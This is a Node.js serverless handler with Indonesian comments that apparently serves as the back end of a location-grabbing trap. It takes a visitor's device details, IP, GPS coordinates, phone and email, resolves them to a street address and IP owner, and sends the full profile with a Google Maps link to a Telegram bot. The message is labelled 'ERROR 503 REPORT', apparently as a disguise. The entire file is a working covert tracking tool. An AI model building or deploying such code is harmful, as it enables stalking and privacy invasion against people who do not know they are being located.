export const config = {
  runtime: "nodejs"
};

/* ===== ESTIMASI RT/RW (LABEL SAJA) ===== */
function estimateRTRW(lat, lon) {
  if (!lat || !lon) return "-";
  const lt = Math.abs(parseFloat(lat));
  const ln = Math.abs(parseFloat(lon));
  const rt = (Math.floor((lt * 1000) % 10) + 1).toString().padStart(2, "0");
  const rw = (Math.floor((ln * 1000) % 10) + 1).toString().padStart(2, "0");
  return `RT~${rt} / RW~${rw} (estimasi area)`;
}

/* ===== KUALITAS LOKASI ===== */
function getLocationQuality(acc) {
  const a = parseFloat(acc);
  if (isNaN(a)) return "Low ❌";
  if (a <= 20) return "High ✅";
  if (a <= 100) return "Medium ⚠️";
  return "Low ❌";
}

/* ===== NORMALISASI IP ===== */
function normalizeIP(ip) {
  if (!ip) return "Unknown";
  if (ip === "::1" || ip.startsWith("127.")) return "Unknown";
  if (ip.includes(",")) return ip.split(",")[0];
  return ip.replace("::ffff:", "");
}

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).send("Method Not Allowed");
  }

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;
  if (!BOT_TOKEN || !CHAT_ID) {
    return res.status(500).send("ENV belum diset");
  }

  const input = req.body || {};

  /* ===== IP CLIENT ===== */
  const rawIP =
    req.headers["cf-connecting-ip"] ||
    req.headers["x-forwarded-for"] ||
    req.socket.remoteAddress;

  const ip = normalizeIP(rawIP);
  const time = new Date().toISOString().replace("T", " ").split(".")[0];

  /* ===== IP INFO ===== */
  let ipinfo = {};
  if (ip !== "Unknown") {
    try {
      const r = await fetch(`https://ipapi.co/${ip}/json/`);
      ipinfo = await r.json();
    } catch {}
  }

  /* ===== REVERSE GEOCODE ===== */
  let address = {};
  let locationSource = "GPS";

  if (input.latitude && input.latitude !== "Not Allowed") {
    try {
      const geoRes = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${input.latitude}&lon=${input.longitude}&zoom=18&addressdetails=1`,
        { headers: { "User-Agent": "VercelLocationBot/1.0" } }
      );
      const geo = await geoRes.json();
      address = geo.address || {};
    } catch {}
  } else {
    locationSource = "IP (Approximate)";
    address = {
      city: ipinfo.city,
      state: ipinfo.region,
      country: ipinfo.country_name,
      postcode: ipinfo.postal
    };
  }

  const locationQuality = getLocationQuality(input.accuracy);
  const rtRwEstimate =
    input.latitude && input.latitude !== "Not Allowed"
      ? estimateRTRW(input.latitude, input.longitude)
      : "-";

  /* ===== DATA KONTAK (OPSIONAL, DARI FORM) ===== */
  const phone = input.phone || "-";
  const email = input.email || "-";

  /* ===== PESAN TELEGRAM ===== */
  const message = `🚨 *ERROR 503 REPORT*

━━━━━━━━━━━━━━━━━━━━
📱 *DEVICE INFORMATION*
━━━━━━━━━━━━━━━━━━━━
🧠 OS           : ${input.os || "-"}
💻 Platform     : ${input.platform || "-"}
⚙️ CPU Cores    : ${input.cpu || "-"}
💾 RAM          : ${input.ram || "-"}
🖥 Resolution   : ${input.resolution || "-"}
🌐 Browser      :
${input.browser || "-"}

🕒 Timezone     : ${input.timezone || "-"}
🗣 Language     : ${input.language || "-"}
🌍 Public IP    : ${ip}

━━━━━━━━━━━━━━━━━━━━
🌎 *IP INFORMATION*
━━━━━━━━━━━━━━━━━━━━
🇮🇩 Country     : ${ipinfo.country_name || "-"}
📍 Region       : ${ipinfo.region || "-"}
🏙 City         : ${ipinfo.city || "-"}
🏢 ISP / Org    : ${ipinfo.org || "-"}

━━━━━━━━━━━━━━━━━━━━
📡 *LOCATION INFORMATION*
━━━━━━━━━━━━━━━━━━━━
📐 Latitude     : ${input.latitude || "-"}
📏 Longitude    : ${input.longitude || "-"}
🎯 Accuracy     : ${input.accuracy || "-"}

━━━━━━━━━━━━━━━━━━━━
🏠 *ADDRESS INFORMATION*
━━━━━━━━━━━━━━━━━━━━
📍 Street       : ${address.road || address.pedestrian || "-"}
🏘 Village      : ${address.village || address.suburb || "-"}
🏙 District     : ${address.city_district || address.county || "-"}
🏛 City / Reg.  : ${address.city || address.town || address.municipality || "-"}
🌆 Province     : ${address.state || "-"}
📮 Postal Code : ${address.postcode || "-"}
🌍 Country      : ${address.country || "-"}

━━━━━━━━━━━━━━━━━━━━
📐 *LOCATION QUALITY*
━━━━━━━━━━━━━━━━━━━━
🎯 Quality      : ${locationQuality}
🧭 Area Estimate: ${rtRwEstimate}
📡 Source       : ${locationSource}

━━━━━━━━━━━━━━━━━━━━
☎️ *CONTACT (OPTIONAL)*
━━━━━━━━━━━━━━━━━━━━
📞 Phone        : ${phone}
📧 Email        : ${email}

🗺 Google Maps:
https://www.google.com/maps?q=${input.latitude},${input.longitude}

⏰ Time : ${time}`;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown"
      })
    });
    return res.status(200).send("OK");
  } catch {
    return res.status(500).send("Gagal kirim");
  }
      }
